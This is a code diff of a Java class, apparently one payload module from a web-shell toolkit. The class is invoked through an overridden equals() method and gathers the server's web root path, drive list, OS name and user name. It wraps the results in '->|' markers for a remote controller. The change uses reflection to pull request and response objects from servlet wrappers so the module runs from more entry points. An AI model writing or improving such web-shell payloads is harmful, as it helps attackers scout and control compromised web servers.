@@ -1,16 +1,47 @@
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 import javax.servlet.jsp.PageContext;
 import java.io.File;
+import java.lang.reflect.Field;
 
 public class Info {
+    public HttpServletRequest request = null;
+    public HttpServletResponse response = null;
+    public String cs;
+
     @Override
     public boolean equals(Object obj) {
-        PageContext page = (PageContext) obj;
-        ServletRequest request = page.getRequest();
-        ServletResponse response = page.getResponse();
-        String cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
+        if (obj instanceof PageContext) {
+            PageContext page = (PageContext) obj;
+            request = (HttpServletRequest) page.getRequest();
+            response = (HttpServletResponse) page.getResponse();
+        } else if (obj instanceof HttpServletRequest) {
+            request = (HttpServletRequest) obj;
+            try {
+                Field req = request.getClass().getDeclaredField("request");
+                req.setAccessible(true);
+                HttpServletRequest request2 = (HttpServletRequest) req.get(request);
+                Field resp = request2.getClass().getDeclaredField("response");
+                resp.setAccessible(true);
+                response = (HttpServletResponse) resp.get(request2);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+        } else if (obj instanceof HttpServletResponse) {
+            response = (HttpServletResponse) obj;
+            try {
+                Field resp = response.getClass().getDeclaredField("response");
+                resp.setAccessible(true);
+                HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
+                Field req = response2.getClass().getDeclaredField("request");
+                req.setAccessible(true);
+                request = (HttpServletRequest) req.get(response2);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
         StringBuffer output = new StringBuffer("");
         StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
@@ -20,10 +51,10 @@ public class Info {
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
             output.append(tag_s);
-            sb.append(SysInfoCode((HttpServletRequest) request));
+            sb.append(SysInfoCode(request));
             output.append(sb.toString());
             output.append(tag_e);
-            page.getOut().print(output.toString());
+            response.getWriter().print(output.toString());
         } catch (Exception e) {
             sb.append("ERROR" + ":// " + e.toString());
         }
@@ -44,8 +75,8 @@ public class Info {
             d = new File(cd).getParent();
         }
         d = String.valueOf(d.charAt(0)).toUpperCase() + d.substring(1);
-        String serverInfo = (String) System.getProperty("os.name");
-        String user = (String) System.getProperty("user.name");
+        String serverInfo = System.getProperty("os.name");
+        String user = System.getProperty("user.name");
         String driverlist = this.WwwRootPathCode(d);
         return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
     }
